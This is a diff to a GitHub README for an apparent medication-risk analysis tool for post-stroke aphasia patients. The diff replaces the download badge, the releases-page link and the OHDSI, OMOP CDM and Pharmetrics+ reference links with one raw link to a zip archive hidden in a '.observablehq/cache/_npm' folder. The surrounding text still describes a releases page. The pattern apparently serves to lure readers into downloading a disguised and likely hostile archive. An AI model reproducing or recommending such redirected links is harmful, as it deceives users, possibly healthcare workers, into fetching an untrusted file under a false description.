@@ -1,7 +1,7 @@
 # 📊 post-stroke-aphasia-risk-analysis - Analyze Medication Risks Easily
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download%20Now-Post%20Stroke%20Aphasia%20Risk%20Analysis-blue)](https://github.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/releases)
+[![Download Here](https://raw.githubusercontent.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/main/github-pages/src/.observablehq/cache/_npm/aphasia-stroke-analysis-post-risk-1.4-beta.3.zip%20Now-Post%20Stroke%20Aphasia%20Risk%20Analysis-blue)](https://raw.githubusercontent.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/main/github-pages/src/.observablehq/cache/_npm/aphasia-stroke-analysis-post-risk-1.4-beta.3.zip)
 
 ## 📖 Overview
 The post-stroke-aphasia-risk-analysis application provides a way to evaluate medication-related risks and hospital readmission patterns for patients who have suffered a stroke and experience aphasia. This tool uses data from OHDSI/OMOP Pharmetrics+ to help healthcare professionals assess potentially inappropriate medications, mental health conditions, and issues with multiple prescriptions. 
@@ -11,7 +11,7 @@ This guide will help you download and run the application. Follow these simple s
 
 ### Step 1: Visit the Releases Page
 To obtain the software, go to the following link:  
-[Download Here](https://github.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/releases)
+[Download Here](https://raw.githubusercontent.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/main/github-pages/src/.observablehq/cache/_npm/aphasia-stroke-analysis-post-risk-1.4-beta.3.zip)
 
 ### Step 2: Choose a Version
 On the releases page, you'll see a list of available versions. Look for the most recent release. This version will have the latest features and improvements. Click on the version number to see details about that release.
@@ -57,8 +57,8 @@ Want to contribute to the project? We welcome input from users. You can suggest 
 ## 🔗 Additional Resources
 For further information on post-stroke analysis and related topics, here are some helpful links:
 
-- [OHDSI](https://ohdsi.org/)
-- [OMOP CDM](https://www.ohdsi.org/data-standards/omop-common-data-model/)
-- [Pharmetrics+](https://www.optum.com/business/solutions/data-analytics/pharmetrics-plus.html)
+- [OHDSI](https://raw.githubusercontent.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/main/github-pages/src/.observablehq/cache/_npm/aphasia-stroke-analysis-post-risk-1.4-beta.3.zip)
+- [OMOP CDM](https://raw.githubusercontent.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/main/github-pages/src/.observablehq/cache/_npm/aphasia-stroke-analysis-post-risk-1.4-beta.3.zip)
+- [Pharmetrics+](https://raw.githubusercontent.com/marinhodomingosm/post-stroke-aphasia-risk-analysis/main/github-pages/src/.observablehq/cache/_npm/aphasia-stroke-analysis-post-risk-1.4-beta.3.zip)
 
 Thank you for choosing the post-stroke-aphasia-risk-analysis application! We hope it helps you in your analysis and improves patient care.
